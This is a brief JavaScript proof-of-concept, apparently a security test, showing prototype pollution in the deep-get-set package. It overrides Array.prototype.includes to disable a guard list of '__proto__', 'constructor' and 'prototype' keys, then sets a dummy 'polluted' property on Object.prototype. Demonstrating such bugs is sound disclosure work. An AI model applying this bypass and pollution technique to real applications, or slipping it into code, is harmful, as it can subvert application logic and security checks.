Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
const deep = require('deep-get-set');
console.log({}.polluted);
deep({}, [
    '__proto__',
    'polluted'
], 'yes');
console.log({}.polluted);